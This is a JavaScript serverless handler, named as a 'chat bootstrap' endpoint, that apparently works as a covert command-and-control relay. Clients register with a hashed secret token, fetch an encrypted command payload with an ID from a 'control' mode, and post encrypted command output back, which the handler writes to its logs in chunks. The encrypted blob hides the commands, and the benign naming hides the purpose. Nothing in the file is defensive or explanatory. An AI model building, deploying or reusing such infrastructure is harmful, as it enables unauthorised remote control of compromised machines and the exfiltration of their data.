import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '45';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
